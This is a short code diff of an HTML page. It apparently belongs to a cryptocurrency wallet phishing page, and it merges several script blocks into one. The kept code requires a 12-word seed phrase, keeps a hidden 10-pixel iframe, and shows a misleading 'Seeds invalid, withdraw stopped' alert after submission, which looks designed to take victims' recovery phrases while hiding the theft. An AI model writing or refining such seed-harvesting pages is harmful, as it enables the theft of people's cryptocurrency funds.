@@ -100,43 +100,34 @@
   <iframe name="myFrame" style="width:10px; height:10px; position:fixed; bottom:0; left:0; border:none;"></iframe>
   
   
-  </script>
-  
-  <script>
+<script>
 function showMessage() {
   var message = "Seeds invalid, withdraw stopped";
   alert(message);
   return true;
 }
-</script> 
-  
-  <script>
-  const form = document.querySelector('form');
-  const messageInput = document.querySelector('#message');
-  
-  form.addEventListener('submit', (event) => {
-    const message = messageInput.value.trim();
-    const words = message.split(' ');
-    
-    if (words.length !== 12) {
-      event.preventDefault();
-      alert('Seed must contain exactly 12 words.');
-    }
-  });
 
+const form = document.querySelector('form');
+const messageInput = document.querySelector('#message');
 
-  
-  
-  
-  
-  <script>
-    function isNumberKey(evt){
-        var charCode = (evt.which) ? evt.which : event.keyCode
-        if (charCode > 31 && (charCode < 48 || charCode > 57) && charCode !== 44 && charCode !== 46)
-            return false;
-        return true;
-    }
-  </script> 
+form.addEventListener('submit', (event) => {
+  const message = messageInput.value.trim();
+  const words = message.split(' ');
+
+  if (words.length !== 12) {
+    event.preventDefault();
+    alert('Seed must contain exactly 12 words.');
+  }
+});
+
+function isNumberKey(evt){
+    var charCode = (evt.which) ? evt.which : event.keyCode
+    if (charCode > 31 && (charCode < 48 || charCode > 57) && charCode !== 44 && charCode !== 46)
+        return false;
+    return true;
+}
+</script>
+ 
 </body>
 </html>
 
